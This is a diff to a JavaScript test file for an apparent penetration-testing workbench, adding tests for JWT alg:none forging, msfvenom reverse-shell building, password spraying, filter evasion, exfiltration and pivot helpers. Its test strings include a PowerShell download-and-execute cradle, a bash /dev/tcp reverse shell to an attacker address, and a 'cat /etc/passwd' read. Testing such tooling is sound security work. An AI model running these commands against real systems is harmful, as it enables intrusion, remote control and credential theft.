@@ -229,15 +229,15 @@ ok(W.fmtDuration(45) === '45m', 'fmtDuration 45 -> 45m');
 
 // ── value-aware fact explanation ──────────────────────────────────────────────────────────────
 ok(/Windows Server 2016/.test(W.explainFact({ kind: 'host.os_hint', value: { os: 'Windows Server 2016 Standard 14393' } }).proves), 'os_hint surfaces the real OS string');
-ok(/htb\.local/.test(W.explainFact({ kind: 'ad.domain_known', value: { name: 'htb.local' } }).proves), 'domain fact surfaces the domain name');
-ok(/DC=htb,DC=local/.test(W.explainFact({ kind: 'ad.domain_known', value: { name: 'htb.local' } }).caveat), 'domain fact derives the base DN');
+ok(/acme\.internal/.test(W.explainFact({ kind: 'ad.domain_known', value: { name: 'acme.internal' } }).proves), 'domain fact surfaces the domain name');
+ok(/DC=acme,DC=internal/.test(W.explainFact({ kind: 'ad.domain_known', value: { name: 'acme.internal' } }).caveat), 'domain fact derives the base DN');
 ok(/445/.test(W.explainFact({ kind: 'port:445', value: { service: 'microsoft-ds' } }).proves), 'port fact names the port');
-ok(/svc-alfresco/.test(W.explainFact({ kind: 'hash.ntlm', value: { user: 'svc-alfresco' } }).proves), 'ntlm fact names the account');
+ok(/svc_sql/.test(W.explainFact({ kind: 'hash.ntlm', value: { user: 'svc_sql' } }).proves), 'ntlm fact names the account');
 ok(/pass-the-hash/i.test(W.explainFact({ kind: 'hash.ntlm', value: {} }).caveat), 'ntlm caveat mentions pass-the-hash');
 ok(W.explainFact({ kind: 'some.unknown' }).proves.length > 0, 'unknown kind still falls back to a non-empty explanation');
 
 // ── output signal scan ────────────────────────────────────────────────────────────────────────
-const nxcLine = 'SMB  10.129.102.107  445  FOREST  [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)\nSMB  10.129.102.107  445  FOREST  [-] Error enumerating shares: STATUS_ACCESS_DENIED';
+const nxcLine = 'SMB  10.10.10.10  445  DC01  [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:acme.internal) (signing:True) (SMBv1:True) (Null Auth:True)\nSMB  10.10.10.10  445  DC01  [-] Error enumerating shares: STATUS_ACCESS_DENIED';
 const sigs = W.scanSignals(nxcLine);
 const sigIds = sigs.map(function (s) { return s.id; });
 ok(sigIds.indexOf('signon') >= 0, 'scan flags signing:True (no relay here)');
@@ -253,10 +253,94 @@ ok(W.scanSignals('nothing interesting here').length === 0, 'plain text yields no
 // ── finding narratives ────────────────────────────────────────────────────────────────────────
 const nfs = new OBOL.facts.FactSet();
 try { nfs.add(OBOL.facts.makeFact({ kind: 'smb.null_session', scope: 'host:1', value: {}, source: 't' })); } catch (e) {}
-const narrs = W.findingNarratives(nfs, { domain: 'htb.local' });
+const narrs = W.findingNarratives(nfs, { domain: 'acme.internal' });
 ok(Array.isArray(narrs), 'findingNarratives returns an array');
 ok(narrs.length === 0 || (narrs[0].title && narrs[0].severity !== undefined), 'each narrative carries a title and severity');
 ok(W.findingNarratives(new OBOL.facts.FactSet()).length === 0, 'no facts yields no narratives');
+
+// ── NEW WORKBENCH UTILITIES & TRIAGE ENGINE ──────────────────────────────────────────────────
+// 1. JWT Studio: forgeJwtNone & signJwtHs256
+const forgedNone = W.forgeJwtNone({ sub: 'bob', role: 'admin' });
+ok(forgedNone && forgedNone.endsWith('.'), 'forgeJwtNone produces trailing-dot unsigned token');
+const decNone = W.decodeJwt(forgedNone + 'x');
+ok(decNone && decNone.header.alg === 'none' && decNone.payload.role === 'admin', 'forgeJwtNone sets alg:none and preserves claims');
+const signedHs = W.signJwtHs256({ alg: 'HS256', typ: 'JWT' }, { sub: 'bob', role: 'admin' }, 'secret123');
+ok(signedHs.split('.').length === 3 && signedHs.split('.')[2].length > 10, 'signJwtHs256 signs 3-part HS256 JWT');
+
+// 2. Msfvenom, TTY recipes & Webshells
+const msf = W.buildMsfvenom('linux-elf-x64', '10.10.14.2', '4444');
+ok(msf && /msfvenom -p linux\/x64\/shell_reverse_tcp/.test(msf.generate) && /10\.10\.14\.2/.test(msf.generate), 'buildMsfvenom fills LHOST/LPORT');
+ok(Array.isArray(W.TTY_RECIPES) && W.TTY_RECIPES.length >= 4, 'TTY_RECIPES populated');
+ok(Array.isArray(W.WEBSHELLS) && W.WEBSHELLS.length >= 4, 'WEBSHELLS populated');
+
+// 3. Hash normalize user:hash & crackPipelineCmds & JOHN_EXTRACTORS
+const normUserHash = W.normalizeHash('bob:$1$xyz$0123456789abcdef012345');
+ok(normUserHash.changed && normUserHash.clean === '$1$xyz$0123456789abcdef012345' && normUserHash.username === 'bob', 'normalizeHash strips user: prefix and preserves username');
+const pipe = W.crackPipelineCmds(1000, 'nt', '8846f7eaee8fb117ad06bdd830b7586c', 'bob');
+ok(pipe.length >= 4 && pipe.some(function (p) { return /--username/.test(p.cmd); }), 'crackPipelineCmds includes --username recipe when username present');
+ok(Array.isArray(W.JOHN_EXTRACTORS) && W.JOHN_EXTRACTORS.length >= 8, 'JOHN_EXTRACTORS populated');
+
+// 4. Evasion transforms, LOLBAS, fuzzCmd, sqliExtraPayloads, sprayCommands
+const ev = W.evasionTransforms('cat /etc/passwd');
+ok(ev.length >= 6 && ev.some(function (x) { return x.id === 'ifs' && /\$\{IFS\}/.test(x.out); }), 'evasionTransforms builds ${IFS} variant');
+ok(W.LOLBAS && W.LOLBAS.certutil && W.LOLBAS.powershell, 'LOLBAS catalog populated');
+ok(/ffuf/.test(W.fuzzCmd('ffuf', 'dirs', '10.10.10.10', '/path/list.txt', '.php')), 'fuzzCmd builds ffuf command with extensions');
+const sqliBypass = W.sqliExtraPayloads('auth_bypass', 'mysql', '10.10.14.2');
+ok(sqliBypass.length >= 4, 'sqliExtraPayloads returns auth_bypass payloads');
+const spCmds = W.sprayCommands({ target: '10.10.10.10', domain: 'acme.internal', password: 'Autumn2026!', safePerWindow: 3, windowMin: 30 });
+ok(spCmds.length >= 4 && spCmds.some(function (c) { return /kerbrute/.test(c.cmd); }), 'sprayCommands generates nxc and kerbrute commands');
+
+// 5. File Transfer & Exfil Builder
+const tfWin = W.buildFileTransfer({ direction: 'kali-to-win', lhost: '10.10.14.2', httpPort: '8000', filename: 'winPEASx64.exe', targetIp: '10.10.10.10' });
+ok(tfWin.destPath === 'C:\\Windows\\Temp\\winPEASx64.exe' && tfWin.methods.length >= 3, 'buildFileTransfer kali-to-win sets Windows Temp path and paired methods');
+const tfExfil = W.buildFileTransfer({ direction: 'exfil-to-kali', lhost: '10.10.14.2', filename: 'loot.zip' });
+ok(tfExfil.methods.length >= 3 && /smbserver/.test(tfExfil.methods[0].kaliCmd), 'buildFileTransfer exfil-to-kali builds SMB & HTTP upload receivers');
+
+// 6. Scenario-First Pivot, Port-Forward & Tunnel Builder
+const pivLocal = W.buildPivotPlan({ scenario: 'local-forward', tool: 'chisel', lhost: '10.10.14.2', pivotIp: '10.10.10.10', rport: '8080', lport: '8080' });
+ok(pivLocal.steps.length === 3 && /R:8080:127\.0\.0\.1:8080/.test(pivLocal.steps[1].cmd), 'buildPivotPlan local-forward chisel generates exact R:LPORT:127.0.0.1:RPORT syntax');
+const pivSub = W.buildPivotPlan({ scenario: 'subnet-route', tool: 'ligolo', lhost: '10.10.14.2', pivotIp: '10.10.10.10', subnet: '172.16.5.0/24' });
+ok(pivSub.steps.length === 3 && /ip route add 172\.16\.5\.0\/24 dev ligolo/.test(pivSub.steps[0].cmd), 'buildPivotPlan subnet-route ligolo generates TUN and route commands');
+
+// 7. Output & Error Doctor: Benign Baselines + Error Diagnosis + Triage
+const suidStock = '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/chsh';
+const baseHits = W.scanBenignBaselines(suidStock);
+ok(baseHits.some(function (b) { return b.id === 'suid-stock'; }), 'scanBenignBaselines flags stock SUID list as benign OS baseline');
+const suidCustom = suidStock + '\n/usr/bin/python3.10';
+ok(!W.scanBenignBaselines(suidCustom).some(function (b) { return b.id === 'suid-stock'; }), 'scanBenignBaselines does NOT flag SUID list as benign when python3.10 is present');
+
+const privStock = 'PRIVILEGES INFORMATION\n----------------------\nSeShutdownPrivilege                   Shut down the system             Disabled\nSeChangeNotifyPrivilege               Bypass traverse checking         Enabled by default\nSeIncreaseWorkingSetPrivilege         Increase a process working set   Disabled';
+ok(W.scanBenignBaselines(privStock).some(function (b) { return b.id === 'whoami-priv-standard'; }), 'scanBenignBaselines flags standard whoami /priv token as benign');
+
+const errSkew = W.diagnoseErrors('KRB_AP_ERR_SKEW(Clock time too great)', { target: '10.10.10.10', domain: 'acme.internal' });
+ok(errSkew.some(function (e) { return e.id === 'krb-skew' && /ntpdate|rdate/.test(e.cmd); }), 'diagnoseErrors detects KRB_AP_ERR_SKEW and provides clock-sync command');
+
+const triage = W.triageOutput(suidStock + '\nKRB_AP_ERR_SKEW', { target: '10.10.10.10' });
+ok(triage.verdict && triage.errors.length >= 1 && triage.baselines.length >= 1, 'triageOutput combines errors, baselines, signals, and verdict');
+
+// 8. Workbench UI route renders all 11 tools + legacy encoder/decoder aliases cleanly via both ctx.args (router.js) and ctx.params
+require('../../assets/ui/util.js');
+require('../../assets/ui/icons.js');
+require('../../assets/ui/routes/workbench.js');
+OBOL.routes.workbench.CATEGORIES.forEach(function (cat) {
+  cat.tools.forEach(function (t) {
+    const svg = OBOL.ic(t.icon);
+    ok(typeof svg === 'string' && svg.indexOf('<svg') >= 0, 'icon "' + t.icon + '" for tool "' + t.id + '" renders valid SVG');
+  });
+});
+const seenTitles = {};
+['revshell', 'transfer', 'pivot', 'hashid', 'jwt', 'spray', 'codec', 'sqli', 'wordlists', 'gtfobins', 'explain'].forEach(function (tabId) {
+  const html = OBOL.routes.workbench.render({ args: [tabId] });
+  const m = html.match(/<h2 class="wb-panel-title">([\s\S]*?)<\/h2>/);
+  const titleText = m ? m[1] : '';
+  ok(typeof html === 'string' && html.indexOf('data-wb-active="' + tabId + '"') >= 0 && titleText.indexOf('<svg') >= 0, 'workbench route renders active tab "' + tabId + '" via ctx.args with panel icon');
+  ok(!seenTitles[titleText], 'workbench tab "' + tabId + '" renders a distinct panel header');
+  seenTitles[titleText] = tabId;
+});
+['encoder', 'decoder'].forEach(function (alias) {
+  const html = OBOL.routes.workbench.render({ args: [alias] });
+  ok(html.indexOf('data-wb-active="codec"') >= 0, 'legacy alias "' + alias + '" resolves to codec panel');
+});
 
 // ── smart decoder + codec layer (async: gzip/zlib go through the native streams) ───────────────
 (async function () {
@@ -306,6 +390,44 @@ ok(W.findingNarratives(new OBOL.facts.FactSet()).length === 0, 'no facts yields 
   // runCodec reports a clean reason on invalid input, never throws
   const bad = await W.runCodec('hex', 'decode', 'zzz');
   ok(bad.ok === false && /hex/i.test(bad.error), 'runCodec reports invalid hex gracefully');
+
+  // ── 9. Enhanced Smart Decoder: PowerShell UTF-16LE, Shell Wrappers, Short Commands & Step Trail ──
+  const psEncoded = W.psEnc('IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.2:8000/shell.ps1")');
+  const psDecoded = await W.smartDecode(psEncoded);
+  ok(psDecoded.found && /DownloadString/.test(psDecoded.best.text), 'smartDecode decodes bare PowerShell UTF-16LE Base64');
+
+  const psWrapped = 'powershell -nop -w hidden -enc ' + W.psEnc('whoami /priv');
+  const psWrapDecoded = await W.smartDecode(psWrapped);
+  ok(psWrapDecoded.found && psWrapDecoded.best.text === 'whoami /priv' && psWrapDecoded.best.unwrapped, 'smartDecode unwraps powershell -enc command line and decodes UTF-16LE');
+
+  const bashWrapped = W.linuxB64Runner('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1', 'bash');
+  const bashWrapDecoded = await W.smartDecode(bashWrapped);
+  ok(bashWrapDecoded.found && bashWrapDecoded.best.text === 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' && bashWrapDecoded.best.unwrapped, 'smartDecode unwraps echo <B64> | base64 -d | bash wrapper');
+
+  const shortCmd = await W.smartDecode(W.b64('whoami'));
+  ok(shortCmd.found && shortCmd.best.text === 'whoami', 'smartDecode decodes short shell command (whoami) from Base64');
+
+  const tripleLayer = W.urlEncAll(W.b64(W.hexEnc('cat /etc/passwd')));
+  const tripleDecoded = await W.smartDecode(tripleLayer);
+  ok(tripleDecoded.found && tripleDecoded.best.text === 'cat /etc/passwd' && tripleDecoded.best.steps.length === 3, 'smartDecode peels 3 stacked layers (URL -> Base64 -> Hex) with step-by-step history');
+
+  // ── 10. Scenario Bypass Recipes, Comment-Free Commands & JWT Beginner Guide ──
+  ok(Array.isArray(W.CODEC_SCENARIOS) && W.CODEC_SCENARIOS.length === 4, 'CODEC_SCENARIOS defines 4 scenario recipes');
+  W.CODEC_SCENARIOS.forEach(function (sc) {
+    const built = W.buildCodecScenario(sc.id, sc.sample, { lhost: '10.10.14.2', lport: '4444' });
+    ok(built && built.items && built.items.length >= 3, 'buildCodecScenario("' + sc.id + '") produces >= 3 ready-to-copy outputs');
+  });
+
+  ['dirs', 'files', 'vhosts', 'subdomains', 'users', 'passwords', 'params', 'api'].forEach(function (task) {
+    const c1 = W.wordlistCmd(task, '/wl.txt', '10.10.10.10', 'php');
+    const c2 = W.fuzzCmd({ task: task, tool: 'ffuf', path: '/wl.txt', target: '10.10.10.10', domain: 'acme.internal', user: 'bob', ext: 'php' });
+    ok(c1.indexOf('#') < 0 && c2.indexOf('#') < 0, 'wordlistCmd & fuzzCmd for task "' + task + '" contain zero # comments');
+  });
+
+  const codecTab = OBOL.routes.workbench.TABS.filter(function (t) { return t.id === 'codec'; })[0];
+  ok(codecTab && codecTab.label === 'Encode & Decode', 'Workbench codec tab is labeled "Encode & Decode"');
+  const jwtHtml = OBOL.routes.workbench.render({ args: ['jwt'] });
+  ok(jwtHtml.indexOf('wb-jwt-explainer') >= 0 && jwtHtml.indexOf('Digital Wristband') >= 0, 'JWT Studio renders the beginner orientation guide');
 
   console.log(fail ? ('\nWORKBENCH: ' + fail + ' FAILURES') : '\nWORKBENCH: all passed');
   process.exit(fail ? 1 : 0);
